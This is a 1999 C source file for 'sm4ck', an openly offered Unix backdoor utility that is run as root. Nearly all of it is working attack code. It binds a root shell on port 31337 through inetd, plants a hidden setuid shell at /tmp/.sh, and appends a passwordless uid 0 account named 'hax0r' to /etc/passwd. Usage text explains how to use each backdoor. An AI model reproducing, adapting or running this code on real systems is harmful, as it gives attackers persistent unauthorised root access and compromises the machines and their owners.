/* sm4ck v0.1

   Adds simple backdoors to the box you execute it on.
   this is so simple it can be done manually.
   and no i dont know c for shit!@$!@

   Compile: gcc sm4ck.c -o sm4ck
   
   Example: ./sm4ck <option>   (i.e. ./sm4ck -a)

   coded by Sector9 of rewted.org - 1999

   http://www.rewted.org   sector9@rewted.org

*/
 

#include <stdio.h>
#include <stdlib.h>

#define MAX_OPTIONS		5

char * options_string [MAX_OPTIONS] = 
{"-p: binds a root shell on port 31337.", 
"-s: creates suid sh in /tmp.", 
"-u: creates hax0r uid0 account w/o passwd.",
"-i: information.", 
"-x: contact.\n" }; 
char * options_arg [MAX_OPTIONS] = {"-p", "-s", "-u", "-i", "-x"};

void main(int argc, char * argv[])
{
	int c, d;
	if (argc==1) // no arguments, print out usage
	{
		printf("\n        (sm4ck)\n");
		printf("\n        simple backdoor utility\n");
		printf("        sector9@rewted.org - FEB 1999\n");
                printf("        *must be run as r00t*\n");
                printf("\n");
                 
                for (c=0; c<MAX_OPTIONS; c++)
			printf("\t%s\n", options_string[c]);
		return;
	}
	else
	{
		for (d=1; d<argc; d++)
		{
			FILE *fd;
			if (!strcmp(argv[d], options_arg[0]))
			{
				printf("\n(sm4ck)\n");
                                printf("sector9@rewted.org\n");
				printf("\nadd1ng backd00r... (-p)\n");
				fd=fopen("/etc/services","a+");fprintf(fd,"backdoor        31337/tcp       backdoor\n");                    
				fd=fopen("/etc/inetd.conf","a+");fprintf(fd,"backdoor        stream  tcp     nowait  root    /usr/sbin/tcpd /bin/sh -i\n");               
				execl("killall", "-HUP", "inetd");		
                                printf("\ndone.\n");   
			        printf("telnet to port 31337\n\n");
			}
      			else if (!strcmp(argv[d], options_arg[1]))
			{
                                printf("\n(sm4ck)\n");
                                printf("sector9@rewted.org\n");
				printf("\nadd1ng backd00r... (-s)\n");
				system("cp /bin/sh /tmp/.sh");
			        system("chmod 4711 /tmp/.sh");
				printf("\ndone.\n");
				printf("execute /tmp/.sh\n\n");

			}
			else if (!strcmp(argv[d], options_arg[2]))
			{
                                printf("\n(sm4ck)\n");
                                printf("sector9@rewted.org\n");
				printf("\nadd1ng backd00r... (-u)\n");
				fd=fopen("/etc/passwd","a+");fprintf(fd,"hax0r::0:0::/:/bin/bash\n");
				printf("\ndone.\n");
				printf("uid 0 and gid 0 account added\n\n");

			}
                        else if (!strcmp(argv[d], options_arg[3]))
                        {
                                printf("\n(sm4ck)\n");
                                printf("sector9@rewted.org\n");
                                printf("\n1nf0... (-i)");
			printf("\n 
				p - Adds entries to /etc/services
    				& /etc/inetd.conf giving you
    				a root shell on port 31337.
    				example: telnet <host> 31337

				s - Creates a copy of /bin/sh to
    				/tmp/.sh which, whenever 
    				executed gives you a root
    				shell.
    				example: /tmp/.sh    

				u - Adds an account with uid and
    				gid 0 to the passwd file.
    				The login is 'hax0r' and 
    				there is no passwd.

");
			}
                        else if (!strcmp(argv[d], options_arg[4]))
                        {
                                printf("\nhttp://www.rewted.org\n");
				printf("\nsector9@rewted.org\n\n");
                        }

		}
	}
}
